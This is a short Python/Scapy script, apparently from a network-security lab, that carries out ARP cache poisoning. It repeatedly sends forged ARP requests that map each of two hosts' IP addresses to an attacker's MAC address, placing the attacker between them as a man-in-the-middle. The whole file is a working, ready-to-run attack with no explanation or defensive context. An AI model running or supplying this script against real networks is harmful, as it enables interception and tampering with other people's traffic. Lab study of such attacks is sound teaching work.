#!/usr/bin/env python3
from scapy.all import *
import time

IP_A = '10.9.0.5'
MAC_A = '02:42:0a:09:00:05'
IP_B = '10.9.0.6'
MAC_B = '02:42:0a:09:00:06'
MAC_M = '02:42:0a:09:00:69'


def send_ARP(edst, esrc, hwsrc, psrc, hwdst, pdst):
    E = Ether(dst=edst, src=esrc)
    A = ARP(hwsrc=hwsrc, psrc=psrc, hwdst=hwdst, pdst=pdst)
    A.op = 1  # 1 for ARP request; 2 for ARP reply
    pkt = E / A
    pkt.show()
    sendp(pkt)


while True:
    send_ARP(MAC_A, MAC_M, MAC_M, IP_B, MAC_A, IP_A)
    send_ARP(MAC_B, MAC_M, MAC_M, IP_A, MAC_B, IP_B)
    time.sleep(5)